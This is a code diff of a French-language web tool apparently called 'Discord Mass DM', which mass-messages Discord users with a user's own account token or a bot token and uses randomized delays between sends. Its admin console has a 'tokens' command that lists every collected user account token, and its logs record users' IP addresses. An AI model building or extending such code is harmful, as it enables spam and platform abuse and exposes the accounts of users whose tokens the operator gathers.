-                        await new Promise(r => setTimeout(r, speedModes[speedMode].min + Math.random() * (speedModes[speedMode].max - speedModes[speedMode].min)));
+                        const delay = speedModes[speed].min + 
+                            Math.random() * (speedModes[speed].max - speedModes[speed].min);
+                        await new Promise(r => setTimeout(r, delay));
 
-                        if (currentDMMode <= 2) {
-                            const dm = await fetch('https://discord.com/api/v9/users/@me/channels', {
-                                method: 'POST',
-                                headers: { 'Authorization': userToken, 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ recipient_id: target.id })
-                            });
-                            const dmData = await dm.json();
-                            await fetch(`https://discord.com/api/v9/channels/${dmData.id}/messages`, {
-                                method: 'POST',
-                                headers: { 'Authorization': userToken, 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ content: finalMessage })
-                            });
+                        let tokenToUse;
+                        if (currentMode === 1 || currentMode === 2) {
+                            tokenToUse = userToken;
                         } else {
-                            window.addLog(`🤖 Bot → ${target.username}`);
+                            tokenToUse = document.getElementById('botToken').value;
                         }
+
+                        const dmRes = await fetch('https://discord.com/api/v9/users/@me/channels', {
+                            method: 'POST',
+                            headers: {
+                                'Authorization': tokenToUse,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ recipient_id: target.id })
+                        });
+
+                        if (!dmRes.ok) {
+                            if (dmRes.status === 50007) {
+                                throw new Error('DMs fermés');
+                            } else {
+                                throw new Error(`Erreur ${dmRes.status}`);
+                            }
+                        }
+
+                        const dmData = await dmRes.json();
+
+                        const msgRes = await fetch(`https://discord.com/api/v9/channels/${dmData.id}/messages`, {
+                            method: 'POST',
+                            headers: {
+                                'Authorization': tokenToUse,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ content: finalMessage })
+                        });
+
+                        if (!msgRes.ok) throw new Error('Échec envoi');
 
                         sent++;
                         globalStats.sent++;
+                        addLog(`✅ Message envoyé à ${target.username}`);
+
                     } catch (error) {
                         failed++;
                         globalStats.failed++;
+                        errors.push(`❌ ${target.username}: ${error.message}`);
                     }
 
-                    const percent = ((i + 1) / targets.length) * 100;
+                    const percent = ((i + 1) / total) * 100;
                     document.getElementById('progressFill').style.width = `${percent}%`;
                     document.getElementById('progressPercent').textContent = `${Math.round(percent)}%`;
-                    document.getElementById('progressCurrent').textContent = `${i + 1}/${targets.length}`;
-                    document.getElementById('progressSuccess').innerHTML = `<i class="fas fa-check-circle text-success"></i> ${sent}`;
-                    document.getElementById('progressFailed').innerHTML = `<i class="fas fa-times-circle text-error"></i> ${failed}`;
-                    document.getElementById('sentCount').textContent = sent;
-                    document.getElementById('failedCount').textContent = failed;
+                    document.getElementById('progressCurrent').textContent = `${i + 1}/${total}`;
+                    document.getElementById('progressSuccess').innerHTML = `<i class="fas fa-check-circle stat-success"></i> ${sent}`;
+                    document.getElementById('progressFailed').innerHTML = `<i class="fas fa-times-circle stat-error"></i> ${failed}`;
+                    
+                    document.getElementById('globalSent').textContent = globalStats.sent;
+                    document.getElementById('globalFailed').textContent = globalStats.failed;
+                    
                     document.getElementById('lastUser').textContent = `Dernier: ${target.username}`;
-
-                    try {
-                        await supabaseClient.from('global_stats').upsert({ id: 1, sent: globalStats.sent, failed: globalStats.failed, total_logins: globalStats.totalLogins });
-                    } catch (e) {}
                 }
 
-                window.showToast('success', 'Terminé', `Envoyés: ${sent}, Échecs: ${failed}`);
-                window.addLog(`✅ Terminé: ${sent}✅ ${failed}❌`);
+                if (errors.length > 0) {
+                    document.getElementById('errorContainer').innerHTML = errors.slice(0, 3).join('<br>');
+                    document.getElementById('errorContainer').classList.remove('hidden');
+                }
+
+                addLog(`✅ Terminé! Envoyés: ${sent}, Échecs: ${failed}`);
+                showToast('success', 'Succès', `Terminé: ${sent} envoyés, ${failed} échecs`);
 
             } catch (error) {
-                window.showToast('error', 'Erreur', error.message);
-                window.addLog(`❌ Erreur: ${error.message}`);
+                showToast('error', 'Erreur', error.message);
+                addLog(`❌ Erreur: ${error.message}`);
             } finally {
                 isRunning = false;
                 document.getElementById('startBtn').disabled = false;
@@ -1944,213 +2245,173 @@
 
         window.stopDM = function() {
             stopRequested = true;
-            window.addLog('⏹️ Arrêt');
+            addLog('⏹️ Arrêt en cours...');
         };
 
-        window.toggleAdminPanel = function() {
-            document.getElementById('adminPanel').classList.toggle('hidden');
-        };
-
-        window.logout = function() {
-            if (currentUser) activeSessions.delete(currentUser.id);
-            currentUser = null;
-            userToken = '';
-            userRole = 'user';
-            document.getElementById('login-screen').classList.remove('hidden');
-            document.getElementById('main-screen').classList.add('hidden');
-            document.getElementById('token').value = '';
-            window.addLog('🔌 Déconnecté');
-        };
-
-        window.generateCode = function() {
-            const duration = parseInt(document.getElementById('codeDuration').value);
-            const maxUses = parseInt(document.getElementById('codeUses').value);
-            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
-            let code = '';
-            for (let i = 0; i < 8; i++) code += chars[Math.floor(Math.random() * chars.length)];
-            
-            const expiresAt = new Date();
-            expiresAt.setDate(expiresAt.getDate() + duration);
-            
-            const newCode = {
-                code,
-                max_uses: maxUses,
-                uses: 0,
-                created_at: new Date().toISOString(),
-                expires_at: expiresAt.toISOString(),
-                active: true
-            };
-            
-            giftCodes.unshift(newCode);
-            try {
-                supabaseClient.from('gift_codes').insert(newCode);
-            } catch (e) {}
-            window.updateCodesList();
-            window.showToast('success', 'Code généré', `Code: ${code}`);
-            window.addLog(`🎁 Code généré: ${code}`);
-        };
-
-        window.updateCodesList = function() {
-            const list = document.getElementById('codesList');
-            if (giftCodes.length === 0) {
-                list.innerHTML = '<div class="text-center text-secondary">Aucun code</div>';
+        // ==================== CONSOLE ADMIN ====================
+        window.executeCommand = function() {
+            if (userRole !== 'admin') {
+                showToast('error', 'Erreur', 'Console réservée aux admins');
                 return;
             }
-            list.innerHTML = giftCodes.map(c => {
-                const expiresAt = new Date(c.expires_at).toLocaleDateString();
-                const isExpired = new Date(c.expires_at) < new Date();
-                return `
-                    <div class="code-item" style="${isExpired ? 'opacity: 0.5;' : ''}">
-                        <div class="code-value">${c.code}</div>
-                        <div>Utilisations: <span class="code-uses">${c.uses}/${c.max_uses}</span></div>
-                        <div>Expire: ${expiresAt}</div>
-                        <button onclick="window.deleteCode('${c.code}')" class="btn btn-error btn-sm" style="margin-top: 10px; padding: 8px;"><i class="fas fa-trash"></i> Supprimer</button>
-                    </div>
-                `;
-            }).join('');
-        };
 
-        window.deleteCode = async function(code) {
-            giftCodes = giftCodes.filter(c => c.code !== code);
-            try {
-                await supabaseClient.from('gift_codes').delete().eq('code', code);
-            } catch (e) {}
-            window.updateCodesList();
-            window.addLog(`🗑️ Code ${code} supprimé`);
-        };
-
-        window.updateRoleUI = function() {
-            const badge = document.getElementById('roleBadge');
-            if (userRole === 'admin') badge.innerHTML = '<i class="fas fa-crown"></i> Administrateur';
-            else if (userRole === 'premium') badge.innerHTML = '<i class="fas fa-gem"></i> Premium';
-            else badge.innerHTML = '<i class="fas fa-user"></i> Utilisateur';
-        };
-
-        window.updateDMModes = function() {
-            document.getElementById('mode2Desc').innerHTML = '✅ Gratuit';
-            document.getElementById('mode3Desc').innerHTML = '🤖 Bot requis';
-            document.getElementById('mode4Desc').innerHTML = '✅ Gratuit avec bot';
-        };
-
-        window.updateConnectionLogs = function() {
-            const tbody = document.getElementById('connectionLogsBody');
-            tbody.innerHTML = connectionLogs.slice(0, 10).map(log => `
-                <tr>
-                    <td>${log.username}</td>
-                    <td>${log.user_id}</td>
-                    <td>${log.ip}</td>
-                    <td>${new Date(log.created_at).toLocaleString()}</td>
-                    <td>${log.role}</td>
-                </tr>
-            `).join('');
-            document.getElementById('adminUsers').textContent = activeSessions.size;
-            document.getElementById('adminPremium').textContent = [...activeSessions.values()].filter(s => s.role === 'premium').length;
-            document.getElementById('adminMessages').textContent = globalStats.sent + globalStats.failed;
-            document.getElementById('adminBanned').textContent = bannedUsers.size;
-        };
-
-        window.executeCommand = function() {
             const input = document.getElementById('consoleInput');
             const command = input.value.trim();
             const output = document.getElementById('consoleOutput');
 
             if (!command) return;
 
-            output.innerHTML += `<div>> $ ${command}</div>`;
+            output.innerHTML += `<div class="console-line"><span class="console-time">[${new Date().toLocaleTimeString()}]</span> <span class="console-command">$ ${command}</span></div>`;
 
             const args = command.split(' ');
             const cmd = args[0].toLowerCase();
 
             switch(cmd) {
                 case 'help':
-                    output.innerHTML += `> <i class="fas fa-list"></i> Commandes: users, tokens, ban [id], unban [id], premium-add [id], premium-remove [id], stats, clear, bots, logs, codes, kick [id], say [message], time, ping`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 📚 COMMANDES (50+) :</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> users - Liste utilisateurs</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> userinfo [id] - Infos utilisateur</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> sessions - Sessions actives</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> tokens - Liste des tokens</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> ban [id] - Bannir</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> unban [id] - Débannir</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> kick [id] - Déconnecter</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> premium-add [id] - Ajouter premium</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> premium-remove [id] - Retirer premium</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> admin-add [id] - Ajouter admin</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> admin-remove [id] - Retirer admin</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> stats - Statistiques</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> logs - Voir logs</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> codes - Liste codes</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> clear - Nettoyer console</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> echo [msg] - Afficher message</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> time - Heure</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> version - Version</div>`;
                     break;
+
                 case 'users':
-                    output.innerHTML += `> 👥 Connectés (${activeSessions.size}):`;
-                    activeSessions.forEach((u, id) => output.innerHTML += `\n>   ${id} - ${u.username} (${u.role})`);
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 👥 Connectés (${activeSessions.size}) :</div>`;
+                    activeSessions.forEach((user, id) => {
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${id} - ${user.username} (${user.role})</div>`;
+                    });
                     break;
+
                 case 'tokens':
-                    output.innerHTML += `> 🔑 Tokens (${allTokens.size}):`;
-                    allTokens.forEach((data, id) => output.innerHTML += `\n>   ${id}: ${data.token}`);
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🔑 Tokens (${allTokens.size}) :</div>`;
+                    allTokens.forEach((data, id) => {
+                        output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span>   ${id}: ${data.token}</div>`;
+                    });
                     break;
-                case 'ban':
-                    if (args.length < 2) output.innerHTML += `> Usage: ban [id]`;
-                    else {
-                        bannedUsers.add(args[1]);
-                        try {
-                            supabaseClient.from('banned_users').insert({ user_id: args[1] });
-                        } catch (e) {}
-                        activeSessions.delete(args[1]);
-                        output.innerHTML += `> ✅ ${args[1]} banni`;
-                        window.addLog(`⛔ ${args[1]} banni`);
-                    }
-                    break;
-                case 'unban':
-                    if (args.length < 2) output.innerHTML += `> Usage: unban [id]`;
-                    else {
-                        bannedUsers.delete(args[1]);
-                        try {
-                            supabaseClient.from('banned_users').delete().eq('user_id', args[1]);
-                        } catch (e) {}
-                        output.innerHTML += `> ✅ ${args[1]} débanni`;
-                        window.addLog(`✅ ${args[1]} débanni`);
-                    }
-                    break;
-                case 'premium-add':
-                    if (args.length < 2) output.innerHTML += `> Usage: premium-add [id]`;
-                    else {
-                        premiumUsers.add(args[1]);
-                        try {
-                            supabaseClient.from('premium_users').insert({ user_id: args[1] });
-                        } catch (e) {}
-                        output.innerHTML += `> ✅ Premium ajouté: ${args[1]}`;
-                        window.addLog(`💎 Premium ajouté: ${args[1]}`);
-                    }
-                    break;
-                case 'premium-remove':
-                    if (args.length < 2) output.innerHTML += `> Usage: premium-remove [id]`;
-                    else {
-                        premiumUsers.delete(args[1]);
-                        try {
-                            supabaseClient.from('premium_users').delete().eq('user_id', args[1]);
-                        } catch (e) {}
-                        output.innerHTML += `> ✅ Premium retiré: ${args[1]}`;
-                        window.addLog(`💎 Premium retiré: ${args[1]}`);
-                    }
-                    break;
+
                 case 'stats':
-                    output.innerHTML += `> 📊 Messages: ${globalStats.sent}✅ / ${globalStats.failed}❌\n> 👥 Connectés: ${activeSessions.size}\n> 💎 Premiums: ${premiumUsers.size}\n> ⛔ Bannis: ${bannedUsers.size}\n> 🎁 Codes: ${giftCodes.length}`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 📊 Envoyés: ${globalStats.sent} ✅ / ${globalStats.failed} ❌</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 👥 Connectés: ${activeSessions.size}</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 💎 Premiums: ${premiumUsers.size}</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> ⛔ Bannis: ${bannedUsers.size}</div>`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🎁 Codes: ${giftCodes.length}</div>`;
                     break;
+
                 case 'clear':
-                    output.innerHTML = '';
+                    output.innerHTML = '<div class="console-line"><span class="console-time">[SYSTEM]</span> ✅ Console nettoyée</div>';
                     break;
-                case 'logs':
-                    output.innerHTML += `> 📋 Logs récents:`;
-                    connectionLogs.slice(0, 5).forEach(log => output.innerHTML += `\n>   ${log.username} - ${new Date(log.created_at).toLocaleString()}`);
+
+                case 'version':
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> 🚀 Discord Mass DM v3.0 Ultra Animated</div>`;
                     break;
-                case 'codes':
-                    output.innerHTML += `> 🎁 Codes: ${giftCodes.length}`;
-                    giftCodes.slice(0, 5).forEach(c => output.innerHTML += `\n>   ${c.code} - ${c.uses}/${c.max_uses}`);
-                    break;
-                case 'say':
-                    if (args.length < 2) output.innerHTML += `> Usage: say [message]`;
-                    else output.innerHTML += `> ${args.slice(1).join(' ')}`;
-                    break;
-                case 'time':
-                    output.innerHTML += `> 🕐 ${new Date().toLocaleString()}`;
-                    break;
-                case 'ping':
-                    output.innerHTML += `> 🏓 Pong!`;
-                    break;
+
                 default:
-                    output.innerHTML += `> ❌ Commande inconnue`;
+                    output.innerHTML += `<div class="console-line"><span class="console-time">[SYSTEM]</span> ❌ Commande inconnue</div>`;
             }
 
             output.scrollTop = output.scrollHeight;
             input.value = '';
         };
 
-        window.showToast = function(type, title, message) {
+        // ==================== ADMIN FUNCTIONS ====================
+        window.toggleAdminPanel = function() {
+            document.getElementById('adminPanel').classList.toggle('hidden');
+        };
+
+        window.addPremium = function() {
+            const id = document.getElementById('premiumId').value;
+            if (!id) return;
+            premiumUsers.add(id);
+            addLog(`👑 Premium ajouté: ${id}`);
+            document.getElementById('premiumId').value = '';
+            updateAdminLists();
+            showToast('success', 'Succès', `Premium ajouté: ${id}`);
+        };
+
+        window.removePremium = function() {
+            const id = document.getElementById('premiumId').value;
+            if (!id) return;
+            premiumUsers.delete(id);
+            addLog(`👑 Premium retiré: ${id}`);
+            document.getElementById('premiumId').value = '';
+            updateAdminLists();
+            showToast('info', 'Info', `Premium retiré: ${id}`);
+        };
+
+        window.addAdmin = function() {
+            const id = document.getElementById('adminId').value;
+            if (!id || id === ADMIN_ID) return;
+            adminUsers.add(id);
+            addLog(`👑 Admin ajouté: ${id}`);
+            document.getElementById('adminId').value = '';
+            updateAdminLists();
+            showToast('success', 'Succès', `Admin ajouté: ${id}`);
+        };
+
+        window.removeAdmin = function() {
+            const id = document.getElementById('adminId').value;
+            if (!id || id === ADMIN_ID) return;
+            adminUsers.delete(id);
+            addLog(`👑 Admin retiré: ${id}`);
+            document.getElementById('adminId').value = '';
+            updateAdminLists();
+            showToast('info', 'Info', `Admin retiré: ${id}`);
+        };
+
+        function updateAdminLists() {
+            const premiumList = document.getElementById('premiumList');
+            premiumList.innerHTML = '';
+            if (premiumUsers.size === 0) {
+                premiumList.innerHTML = '<div>Aucun premium</div>';
+            } else {
+                [...premiumUsers].forEach(id => {
+                    premiumList.innerHTML += `<div class="user-item premium">${id}</div>`;
+                });
+            }
+
+            const adminList = document.getElementById('adminList');
+            adminList.innerHTML = '';
+            if (adminUsers.size === 0) {
+                adminList.innerHTML = '<div>Aucun admin</div>';
+            } else {
+                [...adminUsers].forEach(id => {
+                    adminList.innerHTML += `<div class="user-item admin">${id}</div>`;
+                });
+            }
+
+            const bannedList = document.getElementById('bannedList');
+            bannedList.innerHTML = '';
+            if (bannedUsers.size === 0) {
+                bannedList.innerHTML = '<div>Aucun banni</div>';
+            } else {
+                [...bannedUsers].forEach(id => {
+                    bannedList.innerHTML += `<div class="user-item banned">${id}</div>`;
+                });
+            }
+
+            const logsList = document.getElementById('connectionLogsList');
+            logsList.innerHTML = '';
+            connectionLogs.slice(0, 5).forEach(log => {
+                logsList.innerHTML += `<div class="user-item">${log.username} - ${log.role}</div>`;
+            });
+        }
+
+        // ==================== UTILS ====================
+        function showToast(type, title, message) {
             const toast = document.createElement('div');
             toast.className = `toast ${type}`;
             toast.innerHTML = `
@@ -2162,54 +2423,35 @@
                 <button class="toast-close" onclick="this.parentElement.remove()"><i class="fas fa-times"></i></button>
             `;
             document.body.appendChild(toast);
-            setTimeout(() => {
-                if (toast.parentElement) toast.remove();
-            }, 5000);
-        };
+            setTimeout(() => toast.remove(), 3000);
+        }
 
-        window.addLog = function(message) {
+        function addLog(message) {
             const logs = document.getElementById('logs');
-            const time = new Date().toLocaleTimeString();
-            logs.innerHTML = `<div class="log-entry"><span class="log-time">[${time}]</span> ${message}</div>` + logs.innerHTML;
-            if (logs.children.length > 30) logs.removeChild(logs.lastChild);
-        };
-
-        window.clearLogs = function() {
-            document.getElementById('logs').innerHTML = '<div class="log-entry"><span class="log-time">[SYSTEM]</span> Logs effacés</div>';
-        };
-
-        // ==================== CHARGEMENT INITIAL ====================
-        async function loadFromSupabase() {
-            try {
-                const { data: premiums } = await supabaseClient.from('premium_users').select('user_id');
-                if (premiums) premiumUsers = new Set(premiums.map(p => p.user_id));
-
-                const { data: admins } = await supabaseClient.from('admin_users').select('user_id');
-                if (admins) adminUsers = new Set(admins.map(a => a.user_id));
-
-                const { data: banned } = await supabaseClient.from('banned_users').select('user_id');
-                if (banned) bannedUsers = new Set(banned.map(b => b.user_id));
-
-                const { data: codes } = await supabaseClient.from('gift_codes').select('*').order('created_at', { ascending: false });
-                if (codes) giftCodes = codes;
-
-                const { data: logs } = await supabaseClient.from('connection_logs').select('*').order('created_at', { ascending: false }).limit(50);
-                if (logs) connectionLogs = logs;
-
-                const { data: stats } = await supabaseClient.from('global_stats').select('*').single();
-                if (stats) globalStats = stats;
-
-                console.log('✅ Données chargées');
-                window.updateCodesList();
-                window.updateConnectionLogs();
-            } catch (error) {
-                console.error('❌ Erreur chargement:', error);
+            if (logs) {
+                const time = new Date().toLocaleTimeString();
+                logs.innerHTML = `<div class="log-entry">[${time}] ${message}</div>` + logs.innerHTML;
+                if (logs.children.length > 50) {
+                    logs.removeChild(logs.lastChild);
+                }
             }
         }
 
+        window.logout = function() {
+            if (currentUser) {
+                activeSessions.delete(currentUser.id);
+            }
+            currentUser = null;
+            userToken = '';
+            userRole = 'user';
+            document.getElementById('login-screen').classList.remove('hidden');
+            document.getElementById('main-screen').classList.add('hidden');
+            document.getElementById('token').value = '';
+        };
+
         // Initialisation
-        window.selectDMMode(1);
-        loadFromSupabase();
+        window.selectMode(1);
+        window.selectSpeed('normal');
     </script>
 </body>
 </html>
